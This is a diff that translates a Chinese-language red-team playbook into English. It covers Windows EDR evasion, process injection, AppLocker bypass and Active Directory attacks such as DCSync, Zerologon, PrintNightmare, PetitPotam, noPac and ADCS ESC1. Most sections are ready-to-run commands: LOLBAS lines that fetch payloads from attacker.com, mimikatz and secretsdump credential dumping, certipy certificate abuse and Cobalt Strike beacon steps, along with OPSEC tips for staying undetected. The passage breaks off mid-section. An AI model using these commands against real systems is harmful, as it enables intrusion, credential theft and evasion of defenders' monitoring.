-**前置条件：** 代码执行权限
+**Prerequisites:** code execution privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 从磁盘还原**  _[windows]_
-_从磁盘读取干净DLL_
+**1. Restore from disk**  _[windows]_
+_Read a clean DLL from disk_
 ```
 $ntdll = [System.IO.File]::ReadAllBytes("C:\Windows\System32\ntdll.dll")
 $proc = [System.Diagnostics.Process]::GetCurrentProcess()
 $base = $proc.MainModule.BaseAddress
-# 找到.text段并覆盖
+# Locate the .text section and overwrite it
 ```
 
-**2. 从KnownDlls还原**  _[windows]_
-_从KnownDlls还原_
+**2. Restore from KnownDlls**  _[windows]_
+_Restore from KnownDlls_
 ```
 $section = [Win32.Kernel32]::OpenFileMapping(0x4, $false, "\KnownDlls\ntdll.dll")
 $map = [Win32.Kernel32]::MapViewOfFile($section, 0x4, 0, 0, 0)
-# 复制干净的代码段
+# Copy the clean code section
 ```
 
 **3. Hell's Gate**  _[windows]_
-_Hell's Gate技术_
+_Hell's Gate technique_
 ```
-通过系统调用号直接调用:
-1. 解析NTDLL获取系统调用号
-2. 直接执行syscall
-3. 绕过用户模式Hook
+Call directly via the syscall number:
+1. Parse NTDLL to obtain the syscall number
+2. Execute the syscall directly
+3. Bypass user-mode hooks
 ```
 
 ---
 
-### 进程注入  `process-injection`
-将代码注入到其他进程
-子类：**进程注入** · tags: `injection` `process` `evasion`
+### Process injection  `process-injection`
+Inject code into another process
+Subclass: **Process injection** · tags: `injection` `process` `evasion`
 
-**前置条件：** 代码执行权限
+**Prerequisites:** code execution privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 经典DLL注入**  _[windows]_
-_DLL注入_
+**1. Classic DLL injection**  _[windows]_
+_DLL injection_
 ```
 $proc = Get-Process -Name notepad
 $handle = [Win32.Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
@@ -2103,7 +2103,7 @@ $addr = [Win32.Kernel32]::VirtualAllocEx($handle, 0, $dllPath.Length, 0x3000, 0x
 ```
 
 **2. Process Hollowing**  _[windows]_
-_进程镂空_
+_Process hollowing_
 ```
 1. CreateProcess(CREATE_SUSPENDED)
 2. NtUnmapViewOfSection
@@ -2112,8 +2112,8 @@ _进程镂空_
 5. ResumeThread
 ```
 
-**3. APC注入**  _[windows]_
-_APC队列注入_
+**3. APC injection**  _[windows]_
+_APC queue injection_
 ```
 $threadId = $proc.Threads[0].Id
 $queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
@@ -2122,24 +2122,24 @@ $queueAPC = [Win32.Kernel32]::GetProcAddress($kernel32, "QueueUserAPC")
 
 ---
 
-### AppLocker绕过  `applocker-bypass`
-绕过AppLocker应用程序限制
-子类：**AppLocker** · tags: `applocker` `bypass` `evasion`
+### AppLocker bypass  `applocker-bypass`
+Bypass AppLocker application restrictions
+Subclass: **AppLocker** · tags: `applocker` `bypass` `evasion`
 
-**前置条件：** AppLocker限制环境
+**Prerequisites:** AppLocker-restricted environment
 
-**攻击链：**
+**Attack chain:**
 
-**1. 使用白名单路径**  _[windows]_
-_使用白名单可执行文件_
+**1. Use whitelisted paths**  _[windows]_
+_Use whitelisted executables_
 ```
 C:\Windows\System32\spoolsv.exe
 C:\Windows\System32\svchost.exe
 C:\Program Files\Internet Explorer\ieexec.exe
 ```
 
-**2. LOLBAS利用**  _[windows]_
-_LOLBAS技术_
+**2. LOLBAS abuse**  _[windows]_
+_LOLBAS techniques_
 ```
 regsvr32.exe /s /n /u /i:http://attacker.com/shell.sct scrobj.dll
 mshta.exe http://attacker.com/shell.hta
@@ -2147,46 +2147,46 @@ certutil.exe -urlcache -split -f http://attacker.com/shell.exe shell.exe
 ```
 
 **3. InstallUtil**  _[windows]_
-_InstallUtil绕过_
+_InstallUtil bypass_
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.exe
 ```
 
 **4. MSBuild**  _[windows]_
-_MSBuild执行代码_
+_Execute code via MSBuild_
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj
 ```
 
 ---
 
-### BlockDLLs技术  `evasion-blockdlls`
-阻止非微软DLL加载
-子类：**BlockDLLs** · tags: `evasion` `blockdlls` `edr`
+### BlockDLLs technique  `evasion-blockdlls`
+Block non-Microsoft DLLs from loading
+Subclass: **BlockDLLs** · tags: `evasion` `blockdlls` `edr`
 
-**前置条件：** Windows系统；Cobalt Strike或其他工具
+**Preconditions:** Windows system; Cobalt Strike or another tool
 
-**攻击链：**
+**Attack chain:**
 
 **1. Cobalt Strike BlockDLLs**  _[windows]_
-_启用BlockDLLs_
+_Enable BlockDLLs_
 ```
 beacon> blockdlls start
-阻止非微软签名的DLL加载
+Block non-Microsoft-signed DLLs from loading
 beacon> blockdlls stop
-恢复DLL加载
+Restore DLL loading
 ```
 
-**2. 进程创建时启用**  _[windows]_
-_进程创建时启用_
+**2. Enable at process creation**  _[windows]_
+_Enable at process creation_
 ```
-使用CREATE_SUSPENDED标志创建进程
-设置ProcessSignaturePolicy
-阻止EDR DLL注入
+Create the process with the CREATE_SUSPENDED flag
+Set ProcessSignaturePolicy
+Block EDR DLL injection
 ```
 
-**3. C#实现**  _[windows]_
-_C#实现BlockDLLs_
+**3. C# implementation**  _[windows]_
+_C# implementation of BlockDLLs_
 ```
 [DllImport("kernel32.dll")]
 static extern bool SetProcessMitigationPolicy(...);
@@ -2197,101 +2197,101 @@ SetProcessMitigationPolicy(ProcessMitigationPolicy.Signature, ref policy, size);
 
 ---
 
-### Shellcode加密  `evasion-shellcode-encrypt`
-加密Shellcode绕过静态检测
-子类：**Shellcode加密** · tags: `evasion` `shellcode` `encrypt`
+### Shellcode encryption  `evasion-shellcode-encrypt`
+Encrypt shellcode to bypass static detection
+Subclass: **Shellcode encryption** · tags: `evasion` `shellcode` `encrypt`
 
-**前置条件：** Shellcode；加密工具
+**Preconditions:** shellcode; an encryption tool
 
-**攻击链：**
+**Attack chain:**
 
-**1. AES加密Shellcode**
-_AES加密_
+**1. AES-encrypt the shellcode**
+_AES encryption_
 ```
-使用工具加密:
+Encrypt with a tool:
 python shellcode_encoder.py --input shellcode.bin --output encoded.bin --key randomkey
-生成加密的Shellcode和解密代码
+Produces the encrypted shellcode and decryption code
 ```
 
-**2. XOR加密**
-_XOR加密_
+**2. XOR encryption**
+_XOR encryption_
 ```
-简单XOR加密:
+Simple XOR encryption:
 for i in range(len(shellcode)):
     encoded[i] = shellcode[i] ^ key[i % len(key)]
-运行时解密执行
+Decrypt and execute at runtime
 ```
 
-**3. RC4加密**
-_RC4加密_
+**3. RC4 encryption**
+_RC4 encryption_
 ```
-使用RC4加密Shellcode:
+Encrypt the shellcode with RC4:
 from Crypto.Cipher import ARC4
 cipher = ARC4.new(key)
 encrypted = cipher.encrypt(shellcode)
-运行时使用相同密钥解密
+Decrypt at runtime with the same key
 ```
 
-**4. 多态加密**
-_多态加密_
+**4. Polymorphic encryption**
+_Polymorphic encryption_
 ```
-每次生成不同的解密代码:
-- 随机密钥
-- 随机解密顺序
-- 添加垃圾指令
-- 控制流混淆
+Generate different decryption code each time:
+- Random key
+- Random decryption order
+- Add junk instructions
+- Control-flow obfuscation
 ```
 
 ---
 
-### 进程伪装  `evasion-process-masq`
-伪装进程名称和路径
-子类：**进程伪装** · tags: `evasion` `process` `masquerade`
+### Process masquerading  `evasion-process-masq`
+Disguise the process name and path
+Subclass: **Process masquerading** · tags: `evasion` `process` `masquerade`
 
-**前置条件：** Windows系统
+**Preconditions:** Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. PPID欺骗**  _[windows]_
-_PPID欺骗_
+**1. PPID spoofing**  _[windows]_
+_PPID spoofing_
 ```
 Cobalt Strike:
 beacon> ppid 1234
-设置父进程ID为合法进程
+Set the parent process ID to a legitimate process
 beacon> run [command]
-新进程继承合法父进程
+The new process inherits the legitimate parent process
 ```
 
-**2. 进程参数欺骗**  _[windows]_
-_参数欺骗_
+**2. Process argument spoofing**  _[windows]_
+_Argument spoofing_
 ```
-CreateProcess参数:
-- lpApplicationName: 合法程序路径
-- lpCommandLine: 包含恶意命令
-- 显示为合法进程
+CreateProcess arguments:
+- lpApplicationName: path to a legitimate program
+- lpCommandLine: contains the malicious command
+- Displays as a legitimate process
 ```
 
-**3. 进程镂空**  _[windows]_
-_进程镂空_
+**3. Process hollowing**  _[windows]_
+_Process hollowing_
 ```
-1. 创建合法进程(挂起状态)
-2. 写入恶意代码
-3. 恢复线程执行
-进程名显示为合法程序
+1. Create a legitimate process (suspended)
+2. Write the malicious code
+3. Resume thread execution
+The process name displays as the legitimate program
 ```
 
 ---
 
-### PPID欺骗  `evasion-ppid-spoof`
-伪造父进程ID
-子类：**PPID欺骗** · tags: `evasion` `ppid` `spoofing`
+### PPID spoofing  `evasion-ppid-spoof`
+Forge the parent process ID
+Subclass: **PPID spoofing** · tags: `evasion` `ppid` `spoofing`
 
-**前置条件：** Windows系统；父进程句柄
+**Preconditions:** Windows system; a handle to the parent process
 
-**攻击链：**
+**Attack chain:**
 
-**1. PowerShell实现**  _[windows]_
-_PowerShell PPID欺骗_
+**1. PowerShell implementation**  _[windows]_
+_PowerShell PPID spoofing_
 ```
 $parent = Get-Process -Name explorer
 $pi = New-Object System.Diagnostics.ProcessStartInfo
@@ -2300,55 +2300,55 @@ $pi.ParentProcessId = $parent.Id
 [System.Diagnostics.Process]::Start($pi)
 ```
 
-**2. C#实现**  _[windows]_
-_C#实现_
+**2. C# implementation**  _[windows]_
+_C# implementation_
 ```
 [StructLayout(LayoutKind.Sequential)]
 public struct STARTUPINFOEX {
     public STARTUPINFO StartupInfo;
     public IntPtr lpAttributeList;
 }
-使用PROC_THREAD_ATTRIBUTE_PARENT_PROCESS属性
+Uses the PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
 ```
 
 **3. Cobalt Strike**  _[windows]_
-_Cobalt Strike实现_
+_Cobalt Strike implementation_
 ```
 beacon> ppid [explorer_pid]
 beacon> run notepad.exe
-新进程父进程为explorer.exe
+The new process's parent is explorer.exe
 ```
 
 ---
 
-### DLL侧加载  `evasion-dll-sideloading`
-利用DLL搜索顺序加载恶意DLL
-子类：**DLL侧加载** · tags: `evasion` `dll` `sideloading`
+### DLL side-loading  `evasion-dll-sideloading`
+Abuse DLL search order to load a malicious DLL
+Subclass: **DLL side-loading** · tags: `evasion` `dll` `sideloading`
 
-**前置条件：** Windows系统；可执行文件
+**Preconditions:** Windows system; an executable
 
-**攻击链：**
+**Attack chain:**
 
-**1. DLL劫持**  _[windows]_
-_DLL劫持原理_
+**1. DLL hijacking**  _[windows]_
+_DLL hijacking principle_
 ```
-1. 找到可执行文件加载的DLL
-2. 将恶意DLL放在搜索路径优先位置
-3. 执行程序时加载恶意DLL
+1. Find a DLL loaded by the executable
+2. Place the malicious DLL earlier in the search path
+3. The malicious DLL loads when the program runs
 ```
 
-**2. DLL转发**  _[windows]_
-_DLL转发_
+**2. DLL proxying**  _[windows]_
+_DLL proxying_
 ```
 #pragma comment(linker, "/export:OriginalFunction=original.dll.OriginalFunction")
-导出原始DLL的函数
-同时执行恶意代码
+Export the original DLL's functions
+While also executing the malicious code
 ```
 
-**3. 常见目标**  _[windows]_
-_常见目标DLL_
+**3. Common targets**  _[windows]_
+_Common target DLLs_
 ```
-常见DLL劫持目标:
+Common DLL hijacking targets:
 - version.dll
 - dwmapi.dll
 - uxtheme.dll
@@ -2358,64 +2358,64 @@ _常见目标DLL_
 
 ---
 
-### 参数欺骗  `evasion-arg-spoofing`
-欺骗进程参数显示
-子类：**参数欺骗** · tags: `evasion` `argument` `spoofing`
+### Argument spoofing  `evasion-arg-spoofing`
+Spoof the displayed process arguments
+Subclass: **Argument spoofing** · tags: `evasion` `argument` `spoofing`
 
-**前置条件：** Windows系统
+**Preconditions:** Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. 命令行欺骗**  _[windows]_
-_命令行欺骗_
+**1. Command-line spoofing**  _[windows]_
+_Command-line spoofing_
 ```
-CreateProcess参数:
+CreateProcess arguments:
 lpApplicationName = "C:\Windows\System32\cmd.exe"
 lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"
-实际执行恶意命令
+The actual malicious command still executes
 ```
 
-**2. 环境变量欺骗**  _[windows]_
-_环境变量欺骗_
+**2. Environment-variable spoofing**  _[windows]_
+_Environment-variable spoofing_
 ```
-使用环境变量隐藏参数:
+Hide the argument in an environment variable:
 set EVIL=malicious_command
 cmd /c %EVIL%
-进程列表不显示实际命令
+The process list does not show the real command
 ```
 
-**3. PEB修改**  _[windows]_
-_PEB修改_
+**3. PEB modification**  _[windows]_
+_PEB modification_
 ```
-修改PEB中的命令行:
-1. 创建进程
-2. 修改PEB中的CommandLine缓冲区
-3. 进程管理器显示假参数
+Modify the command line in the PEB:
+1. Create the process
+2. Modify the CommandLine buffer in the PEB
+3. Process manager displays the fake argument
 ```
 
 ---
 
-### 签名二进制利用  `evasion-signed-binary`
-利用微软签名二进制执行代码
-子类：**签名二进制** · tags: `evasion` `signed` `lolbin`
+### Signed-binary abuse  `evasion-signed-binary`
+Execute code via Microsoft-signed binaries
+Subclass: **Signed binaries** · tags: `evasion` `signed` `lolbin`
 
-**前置条件：** Windows系统
+**Preconditions:** Windows system
 
-**攻击链：**
+**Attack chain:**
 
 **1. MSBuild**  _[windows]_
-_MSBuild执行_
+_MSBuild execution_
 ```
 msbuild.exe malicious.csproj
-执行嵌入的C#代码
+Executes embedded C# code
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe
 ```
 
 **2. InstallUtil**  _[windows]_
-_InstallUtil执行_
+_InstallUtil execution_
 ```
 InstallUtil.exe /logfile= /LogToConsole=false /U malicious.dll
-执行.NET程序集
+Executes a .NET assembly
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
 ```
 
@@ -2424,11 +2424,11 @@ _Regsvcs/Regasm_
 ```
 regsvcs.exe malicious.dll
 regasm.exe malicious.dll
-执行.NET程序集
+Executes a .NET assembly
 ```
 
 **4. Rundll32**  _[windows]_
-_Rundll32执行_
+_Rundll32 execution_
 ```
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"
 rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
@@ -2436,572 +2436,572 @@ rundll32.exe shell32.dll,Control_RunDLL malicious.cpl
 
 ---
 
-### CLR注入  `evasion-clr-injection`
-CLR内存注入技术
-子类：**CLR注入** · tags: `evasion` `clr` `injection`
+### CLR Injection  `evasion-clr-injection`
+CLR in-memory injection technique
+Subclass: **CLR Injection** · tags: `evasion` `clr` `injection`
 
-**前置条件：** Windows系统；.NET环境
+**Preconditions:** Windows system; .NET environment
 
-**攻击链：**
+**Attack chain:**
 
-**1. CLR内存加载**  _[windows]_
-_CLR加载原理_
+**1. CLR in-memory loading**  _[windows]_
+_CLR loading principle_
 ```
-使用CLR接口加载.NET程序集:
-1. 获取CLR运行时
-2. 创建AppDomain
-3. 加载程序集
-4. 执行入口点
+Use the CLR interface to load a .NET assembly:
+1. Obtain the CLR runtime
+2. Create an AppDomain
+3. Load the assembly
+4. Execute the entry point
 ```
 
-**2. C#实现**  _[windows]_
-_C# CLR加载_
+**2. C# implementation**  _[windows]_
+_C# CLR loading_
 ```
 var clr = new ClrModule();
 clr.LoadAssembly(File.ReadAllBytes("malicious.exe"));
 clr.Execute("Main");
-从内存执行.NET程序
+Execute the .NET program from memory
 ```
 
 **3. Cobalt Strike**  _[windows]_
-_Cobalt Strike实现_
+_Cobalt Strike implementation_
 ```
 beacon> execute-assembly /path/to/tool.exe args
-从内存执行.NET程序集
-不落地执行
+Execute the .NET assembly from memory
+No disk write
 ```
 
 ---
 
-## 域渗透攻击
+## Domain Penetration Attacks
 
-### 域内权限提升路径  `domain-privilege-escalation`
-利用ACL错误配置进行域权限提升
-子类：**权限提升** · tags: `acl` `privilege` `active-directory` `escalation`
+### Domain Privilege Escalation Path  `domain-privilege-escalation`
+Exploit ACL misconfigurations for domain privilege escalation
+Subclass: **Privilege Escalation** · tags: `acl` `privilege` `active-directory` `escalation`
 
-**前置条件：** 域环境；普通域用户凭证；BloodHound分析结果
+**Preconditions:** Domain environment; regular domain user credentials; BloodHound analysis results
 
-**攻击链：**
+**Attack chain:**
 
-**1. BloodHound分析**
-_查询到域管理员的最短路径_
+**1. BloodHound analysis**
+_Query the shortest path to Domain Admins_
 ```
 MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
 ```
 
-**2. 查找WriteDACL**  _[windows]_
-_查找WriteDACL权限_
+**2. Find WriteDACL**  _[windows]_
+_Find WriteDACL permission_
 ```
 Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*WriteDACL*"}
 ```
 
-**3. 利用WriteDACL**  _[windows]_
-_添加DCSync权限_
+**3. Exploit WriteDACL**  _[windows]_
+_Add DCSync permission_
 ```
 Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
 ```
 
-**4. 执行DCSync**  _[windows]_
-_执行DCSync获取域管哈希_
+**4. Execute DCSync**  _[windows]_
+_Execute DCSync to obtain domain admin hashes_
 ```
 mimikatz.exe "lsadump::dcsync /domain:domain.com /user:Administrator" "exit"
 ```
 
-**5. 查找GenericAll**  _[windows]_
-_查找GenericAll权限_
+**5. Find GenericAll**  _[windows]_
+_Find GenericAll permission_
 ```
 Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*GenericAll*"}
 ```
 
-**6. 重置密码**  _[windows]_
-_重置目标用户密码_
+**6. Reset password**  _[windows]_
+_Reset the target user's password_
 ```
 Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 隐蔽操作**
-_指定域控制器操作_
+**1. Stealthy operation**
+_Specify a domain controller for the operation_
 ```
 Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
 ```
 
-**分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。
+**Analysis:** ACL misconfigurations within a domain are a common privilege escalation path, discoverable via BloodHound.
 
-**OPSEC：** ACL修改会产生日志；优先使用隐蔽的权限；BloodHound可以发现攻击路径
+**OPSEC:** ACL modifications generate logs; prefer stealthier permissions; BloodHound can reveal the attack path
 
 ---
 
-### 跨域信任攻击  `domain-cross-trust`
-利用域信任关系进行跨域攻击
-子类：**跨域攻击** · tags: `trust` `cross-domain` `active-directory` `forest`
+### Cross-Domain Trust Attack  `domain-cross-trust`
+Exploit domain trust relationships for cross-domain attacks
+Subclass: **Cross-Domain Attack** · tags: `trust` `cross-domain` `active-directory` `forest`
 
-**前置条件：** 已获取源域权限；存在域信任关系；目标域信息
+**Preconditions:** Source domain access already obtained; a domain trust relationship exists; target domain information
 
-**攻击链：**
+**Attack chain:**
 
-**1. 枚举信任关系**  _[windows]_
-_枚举域信任关系_
+**1. Enumerate trust relationships**  _[windows]_
+_Enumerate domain trust relationships_
 ```
 Get-NetDomainTrust
 ```
 
-**2. 枚举森林信任**  _[windows]_
-_枚举森林信任关系_
+**2. Enumerate forest trusts**  _[windows]_
+_Enumerate forest trust relationships_
 ```
 Get-NetForestTrust
 ```
 
-**3. 跨域用户枚举**  _[windows]_
-_枚举目标域用户_
+**3. Cross-domain user enumeration**  _[windows]_
+_Enumerate target domain users_
 ```
 Get-NetUser -Domain target.domain.com
 ```
 
-**4. 跨域组枚举**  _[windows]_
-_枚举目标域组_
+**4. Cross-domain group enumeration**  _[windows]_
+_Enumerate target domain groups_
 ```
 Get-NetGroup -Domain target.domain.com
 ```
 
-**5. SID History攻击**  _[windows]_
-_利用SID History跨域提权_
+**5. SID History attack**  _[windows]_
+_Use SID History for cross-domain privilege escalation_
 ```
 mimikatz.exe "kerberos::golden /domain:source.domain.com /sid:S-1-5-21-SOURCE /sids:S-1-5-21-TARGET-519 /krbtgt:HASH /user:Administrator /ptt" "exit"
 ```
 
-**6. 跨域票据**  _[windows]_
-_请求目标域票据_
+**6. Cross-domain ticket**  _[windows]_
+_Request a target domain ticket_
 ```
 asktgt.exe -domain target.domain.com -user Administrator -hash :HASH
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 隐蔽跨域**
-_指定目标域控制器枚举_
+**1. Stealthy cross-domain**
+_Specify the target domain controller for enumeration_
 ```
 Get-NetUser -Domain target.domain.com -DomainController dc.target.domain.com
 ```
 
-**分析：** 跨域信任攻击可以利用信任关系从低安全域向高安全域移动。
+**Analysis:** Cross-domain trust attacks can exploit trust relationships to move from a lower-security domain to a higher-security domain.
 
-**OPSEC：** 跨域攻击会产生日志；SID History需要特殊权限；森林信任更安全
+**OPSEC:** Cross-domain attacks generate logs; SID History requires special privileges; forest trust is safer
 
 ---
 
-### Zerologon攻击  `zerologon`
-CVE-2020-1472 Netlogon提权
-子类：**Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`
+### Zerologon Attack  `zerologon`
+CVE-2020-1472 Netlogon privilege escalation
+Subclass: **Zerologon** · tags: `zerologon` `cve-2020-1472` `domain`
 
-**前置条件：** 可访问域控制器RPC
+**Preconditions:** Access to the domain controller RPC
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检测漏洞**  _[linux]_
-_检测漏洞_
+**1. Detect the vulnerability**  _[linux]_
+_Detect the vulnerability_
 ```
 python zerologon_tester.py DC_NAME DC_IP
-检测是否存在漏洞
+Check whether the vulnerability exists
 ```
 
-**2. 利用漏洞**  _[linux]_
-_利用漏洞_
+**2. Exploit the vulnerability**  _[linux]_
+_Exploit the vulnerability_
 ```
 python zerologon_exploit.py DC_NAME DC_IP
-将DC密码置空
+Set the DC's password to empty
 ```
 
-**3. 导出哈希**  _[linux]_
-_导出哈希_
+**3. Dump hashes**  _[linux]_
+_Dump hashes_
 ```
 secretsdump.py -just-dc -no-pass DOMAIN/DC_NAME$@DC_IP
-导出域内所有哈希
+Dump all hashes in the domain
 ```
 
-**4. 恢复密码**  _[linux]_
-_恢复密码_
+**4. Restore the password**  _[linux]_
+_Restore the password_
 ```
 python zerologon_restore.py DC_NAME DC_IP ORIGINAL_NTLM
-恢复域控密码避免破坏
+Restore the DC password to avoid causing damage
 ```
 
 ---
 
-### PrintNightmare攻击  `printnightmare`
-CVE-2021-34527 打印服务漏洞
-子类：**PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`
+### PrintNightmare Attack  `printnightmare`
+CVE-2021-34527 print spooler service vulnerability
+Subclass: **PrintNightmare** · tags: `printnightmare` `cve-2021-34527` `rce`
 
-**前置条件：** 可访问打印服务RPC
+**Preconditions:** Access to the print spooler service RPC
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检测漏洞**  _[linux]_
-_检测打印服务_
+**1. Detect the vulnerability**  _[linux]_
+_Detect the print spooler service_
 ```
 rpcdump.py @DC_IP | grep MS-RPRN
-检查打印服务是否可用
+Check whether the print spooler service is available
 ```
 
-**2. 利用漏洞**  _[linux]_
-_利用漏洞_
+**2. Exploit the vulnerability**  _[linux]_
+_Exploit the vulnerability_
 ```
 python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
-加载恶意DLL获取SYSTEM权限
+Load a malicious DLL to obtain SYSTEM privileges
 ```
 
-**3. Impacket利用**  _[linux]_
-_使用Impacket_
+**3. Impacket exploitation**  _[linux]_
+_Use Impacket_
 ```
 python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
-触发加载远程DLL
+Trigger loading of a remote DLL
 ```
 
 ---
 
-### PetitPotam攻击  `petitpotam`
-CVE-2021-36942 强制认证攻击
-子类：**PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`
+### PetitPotam Attack  `petitpotam`
+CVE-2021-36942 forced authentication attack
+Subclass: **PetitPotam** · tags: `petitpotam` `cve-2021-36942` `relay`
 
-**前置条件：** 可访问EFSRPC接口
+**Preconditions:** Access to the EFSRPC interface
 
-**攻击链：**
+**Attack chain:**
 
-**1. 启动中继**  _[linux]_
-_启动NTLM中继_
+**1. Start the relay**  _[linux]_
+_Start the NTLM relay_
 ```
 python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
-设置NTLM中继到ADCS
+Set up an NTLM relay to ADCS
 ```
 
-**2. 触发认证**  _[linux]_
-_触发认证_
+**2. Trigger authentication**  _[linux]_
+_Trigger authentication_
 ```
 python petitpotam.py -d domain -u user -p pass attacker_ip DC_IP
-强制DC向攻击者认证
+Force the DC to authenticate to the attacker
 ```
 
-**3. 获取证书**  _[linux]_
-_获取证书_
+**3. Obtain the certificate**  _[linux]_
+_Obtain the certificate_
 ```
-中继成功后获取用户证书
-使用证书进行Pass-the-Cert
+After a successful relay, obtain the user's certificate
+Use the certificate for Pass-the-Cert
 ```
 
 ---
 
-### noPac/SAMAccountName攻击  `samaccountname`
-CVE-2021-42278/CVE-2021-42287 域提权
-子类：**noPac** · tags: `nopac` `cve-2021-42278` `privesc`
+### noPac/SAMAccountName Attack  `samaccountname`
+CVE-2021-42278/CVE-2021-42287 domain privilege escalation
+Subclass: **noPac** · tags: `nopac` `cve-2021-42278` `privesc`
 
-**前置条件：** 普通域用户权限
+**Preconditions:** Regular domain user privileges
 
-**攻击链：**
+**Attack chain:**
 
-**1. 检测漏洞**  _[linux]_
-_检测漏洞_
+**1. Detect the vulnerability**  _[linux]_
+_Detect the vulnerability_
 ```
 python noPac.py domain/user:password -dc-ip DC_IP -debug
-检测是否存在漏洞
+Check whether the vulnerability exists
 ```
 
-**2. 利用漏洞**  _[linux]_
-_利用漏洞_
+**2. Exploit the vulnerability**  _[linux]_
+_Exploit the vulnerability_
 ```
 python noPac.py domain/user:password -dc-ip DC_IP -dc-host DC_NAME -shell
-获取域管权限
+Obtain domain admin privileges
 ```
 
-**3. 攻击原理**
-_攻击原理_
+**3. Attack principle**
+_Attack principle_
 ```
-1. 创建机器账户(名称类似DC)
-2. 清除SPN
-3. 请求TGT
-4. 删除机器账户
-5. 获取域管TGT
+1. Create a machine account (with a name similar to a DC)
+2. Clear the SPN
+3. Request a TGT
+4. Delete the machine account
+5. Obtain a domain admin TGT
 ```
 
 ---
 
-### ADCS滥用攻击  `adcs-abuse`
-Active Directory证书服务滥用
-子类：**ADCS** · tags: `adcs` `certificate` `domain`
+### ADCS Abuse Attack  `adcs-abuse`
+Active Directory Certificate Services abuse
+Subclass: **ADCS** · tags: `adcs` `certificate` `domain`
 
-**前置条件：** ADCS服务可访问
+**Preconditions:** ADCS service is accessible
 
-**攻击链：**
+**Attack chain:**
 
-**1. 枚举ADCS**  _[linux]_
-_枚举ADCS配置_
+**1. Enumerate ADCS**  _[linux]_
+_Enumerate the ADCS configuration_
 ```
 certipy find -u user@domain -p password -dc-ip DC_IP
-枚举证书模板
+Enumerate certificate templates
 ```
 
-**2. 请求用户证书**  _[linux]_
-_请求证书_
+**2. Request a user certificate**  _[linux]_
+_Request a certificate_
 ```
 certipy req -u user@domain -p password -ca CA_NAME -template User
-请求用户证书
+Request a user certificate
 ```
 
 **3. Pass-the-Cert**  _[linux]_
-_使用证书认证_
+_Authenticate with the certificate_
 ```
 certipy auth -pfx user.pfx -dc-ip DC_IP
-使用证书获取TGT
+Use the certificate to obtain a TGT
 ```
 
-**4. Rubeus请求**  _[windows]_
-_Rubeus利用_
+**4. Rubeus request**  _[windows]_
+_Rubeus exploitation_
 ```
 Rubeus.exe asktgt /user:target /certificate:cert.pfx /ptt
-使用Rubeus请求TGT
+Use Rubeus to request a TGT
 ```
 
 ---
 
-### ADCS ESC1漏洞  `adcs-esc1`
-证书模板ESC1滥用
-子类：**ADCS** · tags: `adcs` `esc1` `certificate`
+### ADCS ESC1 Vulnerability  `adcs-esc1`
+Certificate template ESC1 abuse
+Subclass: **ADCS** · tags: `adcs` `esc1` `certificate`
 
-**前置条件：** 存在ESC1配置的模板
+**Preconditions:** A template with ESC1 configuration exists
 
-**攻击链：**
+**Attack chain:**
 
-**1. 识别ESC1**  _[linux]_
-_识别漏洞模板_
+**1. Identify ESC1**  _[linux]_
+_Identify the vulnerable template_
 ```
 certipy find -u user@domain -p password -vulnerable
-查找ESC1漏洞模板
+Find the ESC1-vulnerable template
 ```
 
-**2. 利用ESC1**  _[linux]_
-_请求域管证书_
+**2. Exploit ESC1**  _[linux]_
+_Request a domain admin certificate_
 ```
 certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
-指定SAN为域管
+Specify the SAN as the domain admin
 ```
 
-**3. 认证为域管**  _[linux]_
-_认证为域管_
+**3. Authenticate as domain admin**  _[linux]_
+_Authenticate as domain admin_
 ```
 certipy auth -pfx admin.pfx -dc-ip DC_IP
-使用证书认证为域管
+Use the certificate to authenticate as domain admin
 ```
 
 ---
 
-### 约束委派攻击  `constrained-delegation`
-利用约束委派进行横向移动
-子类：**委派攻击** · tags: `delegation` `constrained` `kerberos`
+### Constrained Delegation Attack  `constrained-delegation`
+Exploit constrained delegation for lateral movement
+Subclass: **Delegation Attack** · tags: `delegation` `constrained` `kerberos`
 
-**前置条件：** 存在约束委派配置的账户
+**Preconditions:** An account with constrained delegation configured exists
 
-**攻击链：**
+**Attack chain:**
 
-**1. 查找约束委派**  _[windows]_
-_查找约束委派账户_
+**1. Find constrained delegation**  _[windows]_
+_Find accounts with constrained delegation_
 ```
 Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties TrustedToAuthForDelegation
-或
-bloodhound查询
+or
